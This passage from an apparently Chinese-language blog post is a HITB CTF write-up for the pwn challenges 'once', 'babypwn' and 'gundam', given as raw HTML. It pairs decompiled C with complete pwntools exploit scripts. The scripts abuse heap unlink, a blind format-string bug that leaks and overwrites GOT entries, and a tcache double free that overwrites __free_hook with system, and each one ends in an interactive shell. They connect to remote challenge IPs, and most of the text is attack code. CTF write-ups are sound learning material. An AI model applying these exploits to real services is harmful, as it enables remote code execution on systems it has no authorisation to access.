class="comment">// eax@2</span></span><br><span class="line">  __int64 v1; <span class="comment">// rcx@4</span></span><br><span class="line">  __int64 v2; <span class="comment">// [sp+8h] [bp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  v2 = *MK_FP(__FS__, <span class="number">40L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( bss_once_flag_2 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    bss_once_mem = (bin *)bss_once_mem-&gt;bk;</span><br><span class="line">    bss_once_mem-&gt;fd = (__int64)&amp;unk_202020;</span><br><span class="line">    bss_once_flag_2 = <span class="number">1</span>;</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"success."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v1 = *MK_FP(__FS__, <span class="number">40L</span>L) ^ v2;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第四个函数中可以申请任意大的堆块，并对这个堆块申请、释放。</p><p>此题中开启了全部保护，因此无法获悉其内部任何地址。</p><p>本题解题思路是：</p><p>1 根据给定的功能泄露libc地址</p><p>2 使用1功能初始链</p><p>3 利用4功能申请一个大堆块备用</p><p>4 利用2功能，修改小堆块中的fd指针的末位字节（由于bss地址未知），使其地址指向bss段上ptr指针-0x10</p><p>5 利用3功能unlink，使bss段上ptr指针写入 PIE + 0x202020的地址</p><p>6 利用4功能中的编辑函数，由于ptr指针已被我们覆盖，因此可以对bss段上内容任意写，目的是覆盖功能2的指针及功能使用限制的标志位</p><p>7 将__free_hook覆写为system，释放堆块，得到shell</p><p><strong>EXP：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./once'</span>)</span><br><span class="line"><span class="comment">#flag&#123;t1-1_1S_0_sImPl3_n0T3&#125;</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p = process(<span class="string">'./once'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'47.75.189.102'</span>, <span class="number">9999</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"><span class="comment">#off = 0x001b0000</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'0'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Invalid choice\n'</span>)</span><br><span class="line">libc.address = int(p.recvuntil(<span class="string">'&gt;'</span>)[:<span class="number">-1</span>],<span class="number">16</span>)-libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'size:'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0xe0</span>))</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.send(<span class="string">'a'</span>*<span class="number">16</span>+<span class="string">'b'</span>*<span class="number">8</span> + chr(<span class="number">0x58</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.send(<span class="string">'/bin/sh\0'</span>+ <span class="string">'\0'</span>*<span class="number">0x10</span> + p64(libc.symbols[<span class="string">'__free_hook'</span>]) + p64(libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>] )+ p64(<span class="number">0</span>) + p64(libc.symbols[<span class="string">'_IO_2_1_stdin_'</span>]) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(next(libc.search(<span class="string">'/bin/sh'</span>))) +p64(<span class="number">0</span>)*<span class="number">4</span> )</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.send(p64(libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] system '</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x08048e48 : add esp, 0x1c ; ret</span></span><br></pre></td></tr></table></figure><h1 id="babypwn"><a href="#babypwn" class="headerlink" title="babypwn"></a>babypwn</h1><p>此题题目给出的提示就是盲pwn ，通过测试可以明显分析出漏洞是格式化字符串，并且偏移是6。并且程序是64位程序，所以编写泄露脚本来dump脚本就可以了。</p><p><strong>此题的坑点在于使用gets函数来接收用户输入，因此输入\x0a及\x20会被截断</strong></p><p><strong>此题的坑点在于使用gets函数来接收用户输入，因此输入\x0a及\x20会被截断</strong></p><p><strong>此题的坑点在于使用gets函数来接收用户输入，因此输入\x0a及\x20会被截断</strong></p><p>这一点坑了好久一直不懂为啥每次dump输出出来的内容都不对，最后dump出来后修改了几个字节读出了程序的正常逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall __<span class="function">noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> format; <span class="comment">// [sp+0h] [bp-110h]@2</span></span><br><span class="line">  __int64 v4; <span class="comment">// [sp+108h] [bp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  v4 = v28;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    gets((__int64)&amp;format, <span class="number">0L</span>L);</span><br><span class="line">    usleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(&amp;format);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有了binary文件就比较简单了，通过got表可以泄露出题中给出的setbuf、gets、usleep函数地址，其中printf@got不可用，因为地址是0x6010<strong>20</strong> ，利用libc-database得到程序的libc。</p><p>最终通过修改gets@got为system及linux的并行命令拿到shell，64位的程序格式化字符串需要注意的坑点是哟啊先写字符串再加地址，否则是有截断的。</p><p><strong>EXP</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#coding:utf-8</span></span><br><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line">#HITB&#123;Baby_Pwn_BabY_bl1nd&#125;</span><br><span class="line"></span><br><span class="line">#context(arch='i386',os='linux',endian='little')</span><br><span class="line">now = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p = process('./easy_pwn')</span><br><span class="line">libc = ELF('libc6_2.23-0ubuntu10_amd64.so')</span><br><span class="line">#context.kernel = 'amd64'</span><br><span class="line"><span class="meta">#off = 0x001b2000</span></span><br><span class="line">context.log_level = 'debug'</span><br><span class="line"><span class="meta">#gdb.attach(p)</span></span><br><span class="line">#gdb.attach(p,'vmmap')</span><br><span class="line">gdb.attach(p,'b *0x804882b')</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote('47.75.182.113', 9999)</span><br><span class="line">libc = ELF('libc6_2.23-0ubuntu10_amd64.so')</span><br><span class="line">context.log_level = 'debug'</span><br><span class="line">#libc = ELF('./libc-2.23.so')</span><br><span class="line"><span class="meta">#off = 0x001b0000</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">11</span></span><br><span class="line">def leak(str,output,addr):</span><br><span class="line">global now,count </span><br><span class="line">#p.recvuntil('Username:')</span><br><span class="line"><span class="meta">#p.sendline(str)</span></span><br><span class="line">#p.recvuntil('Hello ')</span><br><span class="line">#if('Password')</span><br><span class="line">#tmp = p.recvuntil('p4nda')#recvuntil('p1e')</span><br><span class="line"><span class="meta">#a = tmp[0]</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> (tmp[0] == <span class="meta-string">'p'</span>) &amp; (tmp[1] == <span class="meta-string">'1'</span>)&amp; (tmp[2] == <span class="meta-string">'e'</span>):</span></span><br><span class="line"><span class="meta">#a = <span class="meta-string">'\0'</span></span></span><br><span class="line"><span class="meta">#print (a)</span></span><br><span class="line">#p = remote('47.75.182.113', 9999)</span><br><span class="line">p.sendline(str)</span><br><span class="line">p.recvuntil('&lt;&lt;&lt;&lt;')</span><br><span class="line">tmp = p.recvuntil('&gt;&gt;&gt;&gt;')</span><br><span class="line"><span class="meta">#print tmp</span></span><br><span class="line">if tmp.startswith('&gt;&gt;&gt;&gt;'):</span><br><span class="line">a = <span class="string">'\0'</span></span><br><span class="line">now += <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">if</span> addr&amp;<span class="number">0xff</span> == <span class="number">0x0a</span>:</span><br><span class="line">#print '[-] error'</span><br><span class="line"><span class="meta">#exit(0)</span></span><br><span class="line">count +=<span class="number">1</span></span><br><span class="line">now += <span class="number">1</span></span><br><span class="line">a = '\xf0'</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">a = tmp.split('&gt;&gt;&gt;&gt;')[0]</span><br><span class="line">now += len(a)</span><br><span class="line">print a </span><br><span class="line">output.write(a)</span><br><span class="line">#p.close()</span><br><span class="line"></span><br><span class="line">#p.sendline('')</span><br><span class="line"></span><br><span class="line">def find_offset():</span><br><span class="line">for i in range(1,20):</span><br><span class="line">str = '%%%d$x'%(i)</span><br><span class="line">print '[%d]'%i</span><br><span class="line">leak(str)</span><br><span class="line"></span><br><span class="line">def ori_file(str,output):</span><br><span class="line">p.recvuntil('Username:')</span><br><span class="line">p.sendline(str)</span><br><span class="line">#p.recvuntil('p4nda')</span><br><span class="line">p.recvuntil('Hello ')</span><br><span class="line">a = p.recv(<span class="number">1</span>)</span><br><span class="line">print hex(<span class="keyword">int</span>(a)),</span><br><span class="line"></span><br><span class="line">output.write(a)</span><br><span class="line">p.recvuntil('Password')</span><br><span class="line">p.sendline('')</span><br><span class="line">def find_ori():</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">output = open('bin', 'wb')</span><br><span class="line">pro = log.progress('ori_geting')</span><br><span class="line">end = <span class="number">0x1000</span></span><br><span class="line"><span class="keyword">while</span> now &lt; end:</span><br><span class="line">pro.status('recover:'+hex(0x400000+now))</span><br><span class="line">str = '&lt;&lt;&lt;&lt;%8$s&gt;&gt;&gt;&gt;'+'p1e'+'\0' +p64(0x400000+now)</span><br><span class="line">leak(str,output,<span class="number">0x400000</span>+now)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line">for i in range(0,0x1000):</span><br><span class="line">#find_offset()</span><br><span class="line">pro.status('recover:'+hex(0x400000+i))</span><br><span class="line">str = '&lt;&lt;&lt;&lt;%8$s&gt;&gt;&gt;&gt;'+'p1e'+'\0' +p64(0x400000+i)  #'%7$s'+'p1e'+'\0'+p64(0x400000+i)+'\np4nda\0\0\0'# + p32(0x8048970)</span><br><span class="line">leak(str,output,<span class="number">0x400000</span>+i)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">for i in range(0,0x2000):</span><br><span class="line">#find_offset()</span><br><span class="line">pro.status('recover:'+hex(0x600000+i))</span><br><span class="line">str = '&lt;&lt;&lt;&lt;%8$s&gt;&gt;&gt;&gt;'+'p1e'+'\0' +p64(0x600000+i)# + p32(0x8048970)</span><br><span class="line">#str = '%7$s'+'p1e'+'\0'+p64(0x600000+i)+'\np4nda\0\0\0'# + p32(0x8048970)</span><br><span class="line">leak(str,output,<span class="number">0x600000</span>+i)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line">pro.success('get ori_file')</span><br><span class="line">output.close()</span><br><span class="line">#find_ori()</span><br><span class="line">def test():</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">a = raw_input()</span><br><span class="line">str = '&lt;&lt;&lt;&lt;%8$s&gt;&gt;&gt;&gt;'+'p1e'+'\0'+p64(int(a,16)) + '\n'# + p32(0x8048970) + </span><br><span class="line">p.sendline(str)</span><br><span class="line">p.recvuntil('&lt;&lt;&lt;&lt;')</span><br><span class="line">tmp = p.recvuntil('&gt;&gt;&gt;&gt;')</span><br><span class="line">print tmp</span><br><span class="line">if tmp.startswith('&gt;&gt;&gt;&gt;'):</span><br><span class="line">a = <span class="string">'\0'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">a = tmp[<span class="number">0</span>]</span><br><span class="line">print a</span><br><span class="line">#test()</span><br><span class="line">#str = '%7$s'+'p1e'+'\0'+p64(0x40070b)</span><br><span class="line"><span class="meta">#p.sendline(str)</span></span><br><span class="line"><span class="meta">#def find_password():</span></span><br><span class="line"></span><br><span class="line">#str = '%14$s'+'\0'*2+'p4nda'+p32(0x804A08C)</span><br><span class="line">#find_password(str)</span><br><span class="line"><span class="meta">#i+=1</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">for i in range(0,100):</span><br><span class="line">str = '%13$caaa' + p32(0x8040000+i*4)  </span><br><span class="line">leak(str)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line">#print '[-] count ',count</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">str = '&lt;&lt;&lt;&lt;%8$s&gt;&gt;&gt;&gt;'+'p1e'+'\0'+p64(0x601018) + '\n'</span><br><span class="line">p.sendline(str)</span><br><span class="line">p.recvuntil(<span class="string">"&lt;&lt;&lt;&lt;"</span>)</span><br><span class="line">leak1 = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line"></span><br><span class="line">str = '&lt;&lt;&lt;&lt;%8$s&gt;&gt;&gt;&gt;'+'p1e'+'\0'+p64(0x601030) + '\n'</span><br><span class="line">p.sendline(str)</span><br><span class="line">p.recvuntil(<span class="string">"&lt;&lt;&lt;&lt;"</span>)</span><br><span class="line">leak2 = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line"></span><br><span class="line">str = '&lt;&lt;&lt;&lt;%8$s&gt;&gt;&gt;&gt;'+'p1e'+'\0'+p64(0x601028) + '\n'</span><br><span class="line">p.sendline(str)</span><br><span class="line">p.recvuntil(<span class="string">"&lt;&lt;&lt;&lt;"</span>)</span><br><span class="line">leak3 = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line"></span><br><span class="line">print '[*] setbuf ',hex(leak1)</span><br><span class="line">print '[*] usleep ',hex(leak2)</span><br><span class="line">print '[*] gets   ',hex(leak3)</span><br><span class="line">libc.address = leak1 - libc.symbols['setbuf']</span><br><span class="line">print '[*] system ',hex(libc.symbols['system'])</span><br><span class="line">context.clear(arch = 'amd64')</span><br><span class="line">#str = repr(fmtstr_payload(7, &#123;0x601028: libc.symbols['system']-8 &#125;, write_size='byte'))</span><br><span class="line">target = libc.symbols['system']</span><br><span class="line">#str1 = <span class="string">"%%%dc%%12$hhn%%%dc%%13$hn"</span>%((target&amp;<span class="number">0xff</span>),(target&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xffff</span>-(target&amp;<span class="number">0xff</span>)) </span><br><span class="line"></span><br><span class="line">str1 = <span class="string">"%%%dc%%12$hhn%%%dc%%13$hn"</span>%(((target&amp;<span class="number">0xff</span>)),(target&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xffff</span>-(target&amp;<span class="number">0xff</span>)) </span><br><span class="line">str1 += ';/bin/sh\0;'</span><br><span class="line">str1 = str1.ljust(<span class="number">48</span>,<span class="string">'a'</span>)</span><br><span class="line">str1 += p64(<span class="number">0x601028</span>)</span><br><span class="line">str1 += p64(<span class="number">0x601029</span>)</span><br><span class="line">print '[+] ',len(str1)</span><br><span class="line">#'/bin/sh;' + p64(0x601028) + p64(0x601029) + p64(0x601030) + "%%%dc%%7$p"%((target &amp; 0xff) - 7) </span><br><span class="line">if ('\x20' in str1) | ('\x0a' in str1):</span><br><span class="line">print '[-]'</span><br><span class="line">print str1</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line">print str1</span><br><span class="line">p.sendline(str1)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="string">'''</span></span><br><span class="line">[*] setbuf  <span class="number">0x7fdcfdb2e6b0</span></span><br><span class="line">[*] usleep  <span class="number">0x7fdcfdbb5d60</span></span><br><span class="line">[*] gets    <span class="number">0x7fdcfdb26d80</span></span><br><span class="line">[*] system  <span class="number">0x7fdcfdafd390</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h1 id="gundam"><a href="#gundam" class="headerlink" title="gundam"></a>gundam</h1><p>此题是一道比较明显漏洞的题目，漏洞在destroy函数中，一个double free漏洞。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">destroy</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax@5</span></span><br><span class="line">  __int64 v1; <span class="comment">// rcx@8</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [sp+4h] [bp-Ch]@3</span></span><br><span class="line">  __int64 v3; <span class="comment">// [sp+8h] [bp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  v3 = *MK_FP(__FS__, <span class="number">40L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( !bss_sum )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"No gundam"</span>);</span><br><span class="line">LABEL_7:</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Which gundam do you want to Destory:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">8</span> &amp;&amp; bss_list[(<span class="keyword">unsigned</span> __int64)v2] )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)bss_list[(<span class="keyword">unsigned</span> __int64)v2] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">free</span>(*(<span class="keyword">void</span> **)(bss_list[(<span class="keyword">unsigned</span> __int64)v2] + <span class="number">8L</span>L));</span><br><span class="line">    <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Invalid choice"</span>);</span><br><span class="line">  result = <span class="number">0L</span>L;</span><br><span class="line">LABEL_8:</span><br><span class="line">  v1 = *MK_FP(__FS__, <span class="number">40L</span>L) ^ v3;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其他不同的是本题使用的libc是libc 2.26版本，此版本及以后，加入了tcache功能，这个功能我在<a href="http://p4nda.top/2018/03/20/tcache/">之前的博客</a> 中分析过，加入这个功能会降低堆块利用的难度，只是地址泄露的时候有一定差别。</p><p>堆块会优先填充tcache并先从tcache中拿走，在从tcache中拿走的过程中并没有检查size，放入的过程中没有检查double free，因此存在double free可以劫持tcache，造成任意地址写。</p><p> 此题选择覆写__free_hook为system，最终free拿到shell。</p><p><strong>EXP</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="comment">#HITB&#123;now_you_know_about_tcache&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p = process(<span class="string">'./gundam'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">context.log_level = <span 